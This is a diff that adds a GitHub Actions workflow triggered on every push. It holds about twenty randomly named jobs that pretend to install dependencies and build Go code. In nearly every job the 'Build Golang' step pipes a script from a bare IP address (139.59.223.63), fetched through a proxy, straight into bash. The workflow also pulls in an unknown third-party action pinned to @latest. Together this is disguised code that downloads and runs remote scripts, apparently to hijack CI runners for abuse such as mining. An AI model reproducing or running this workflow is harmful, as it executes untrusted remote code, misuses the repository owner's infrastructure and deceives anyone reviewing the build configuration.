@@ -1,0 +1,183 @@
+name: veliyu
+on: push
+jobs:
+  mabiki:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lipaoneodss/krum@latest
+    - name: First
+      run: echo "Installing Dependencies gigiyo..."
+    - name: Build Golang notuheku
+      run: curl -x 139.59.223.63:7122 http://139.59.223.63/mandalorian/eermdyge.php?a=jerutodirutonulaha | bash -
+  nomejivi:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lipaoneodss/krum@latest
+    - name: First
+      run: echo "Installing Dependencies togafe..."
+    - name: Build Golang pometoze
+      run: curl -x 139.59.223.63:7122 http://139.59.223.63/mandalorian/eermdyge.php?a=heradoribaxehapuzitu | bash -
+  gefazi:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lipaoneodss/krum@latest
+    - name: First
+      run: echo "Installing Dependencies midisuro..."
+    - name: Build Golang behudu
+      run: curl -x 139.59.223.63:7122 http://139.59.223.63/mandalorian/eermdyge.php?a=wusetuseyomatana | bash -
+  nofevula:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lipaoneodss/krum@latest
+    - name: First
+      run: echo "Installing Dependencies nehiju..."
+    - name: Build Golang joveco
+      run: curl -x 139.59.223.63:7122 http://139.59.223.63/mandalorian/eermdyge.php?a=duwigesedupedoyo | bash -
+  bovekobu:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lipaoneodss/krum@latest
+    - name: First
+      run: echo "Installing Dependencies jimolutu..."
+    - name: Build Golang zahaxe
+      run: curl -x 139.59.223.63:7122 http://139.59.223.63/mandalorian/eermdyge.php?a=rijurowunicocepetutu | bash -
+  foluso:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lipaoneodss/krum@latest
+    - name: First
+      run: echo "Installing Dependencies gidivayu..."
+    - name: Build Golang rodiwofa
+      run: curl -x 139.59.223.63:7122 http://139.59.223.63/mandalorian/eermdyge.php?a=xegotefadumijageto | bash -
+  riyazoji:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lipaoneodss/krum@latest
+    - name: First
+      run: echo "Installing Dependencies tunezi..."
+    - name: Build Golang lohala
+      run: curl -x 139.59.223.63:7122 http://139.59.223.63/mandalorian/eermdyge.php?a=zusegororipujiduhilavo | bash -
+  yosuyi:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lipaoneodss/krum@latest
+    - name: First
+      run: echo "Installing Dependencies mulutale..."
+    - name: Build Golang xigusugu
+      run: curl -x 139.59.223.63:7122 http://139.59.223.63/mandalorian/eermdyge.php?a=cenocewegacijecotawa | bash -
+  bopama:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lipaoneodss/krum@latest
+    - name: First
+      run: echo "Installing Dependencies kojayosi..."
+    - name: Build Golang mapili
+      run: curl -x 139.59.223.63:7122 http://139.59.223.63/mandalorian/eermdyge.php?a=jilijabalavizofoko | bash -
+  behane:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lipaoneodss/krum@latest
+    - name: First
+      run: echo "Installing Dependencies xarulo..."
+    - name: Build Golang gatudu
+      run: curl -x 139.59.223.63:7122 http://139.59.223.63/mandalorian/eermdyge.php?a=yapayuwemulecomoluje | bash -
+  gaheyu:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lipaoneodss/krum@latest
+    - name: First
+      run: echo "Installing Dependencies pamapude..."
+    - name: Build Golang xaxekuwu
+      run: curl -x 139.59.223.63:7122 http://139.59.223.63/mandalorian/eermdyge.php?a=dafuhaniwupojokamoxu | bash -
+  wokixofe:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lipaoneodss/krum@latest
+    - name: First
+      run: echo "Installing Dependencies rutire..."
+    - name: Build Golang wuyabu
+      run: curl -x 139.59.223.63:7122 http://139.59.223.63/mandalorian/eermdyge.php?a=tapiwevogewaduxapase | bash -
+  wedifa:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lipaoneodss/krum@latest
+    - name: First
+      run: echo "Installing Dependencies liyani..."
+    - name: Build Golang begucu
+      run: curl -x 139.59.223.63:7122 http://139.59.223.63/mandalorian/eermdyge.php?a=luvopivezebizanano | bash -
+  dunefi:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lipaoneodss/krum@latest
+    - name: First
+      run: echo "Installing Dependencies heviso..."
+    - name: Build Golang nimohu
+      run: curl -x 139.59.223.63:7122 http://139.59.223.63/mandalorian/eermdyge.php?a=zarulodagicegezetowomalo | bash -
+  lewuxamu:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lipaoneodss/krum@latest
+    - name: First
+      run: echo "Installing Dependencies zeweyi..."
+    - name: Build Golang pegezipo
+      run: curl -x 139.59.223.63:7122 http://139.59.223.63/mandalorian/eermdyge.php?a=daviwacitufaxocenodi | bash -
+  cudaca:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lipaoneodss/krum@latest
+    - name: First
+      run: echo "Installing Dependencies rebege..."
+    - name: Build Golang picoca
+      run: curl -x 139.59.223.63:7122 http://139.59.223.63/mandalorian/eermdyge.php?a=fojexehajuxacupibi | bash -
+  loviyu:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lipaoneodss/krum@latest
+    - name: First
+      run: echo "Installing Dependencies lexezima..."
+    - name: Build Golang xavelo
+      run: curl -x 139.59.223.63:7122 http://139.59.223.63/mandalorian/eermdyge.php?a=cazokesejivibopero | bash -
+  wodayoko:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lipaoneodss/krum@latest
+    - name: First
+      run: echo "Installing Dependencies dinofi..."
+    - name: Build Golang ceririre
+      run: curl -x 139.59.223.63:7122 http://139.59.223.63/mandalorian/eermdyge.php?a=kimehoronukabehekoja | bash -
+  lacika:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lipaoneodss/krum@latest
+    - name: First
+      run: echo "Installing Dependencies tivisu..."
+    - name: Build Golang gihojoga
+      run: curl -x 139.59.223.63:7122 http://139.59.223.63/mandalorian/eermdyge.php?a=xegotidolizikilipu | bash -
+  cahedu:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lipaoneodss/krum@latest
+    - name: First
+      run: echo "Installing Dependencies gibusa..."
+    - name: Build Golang xakepi
+      run: echo done
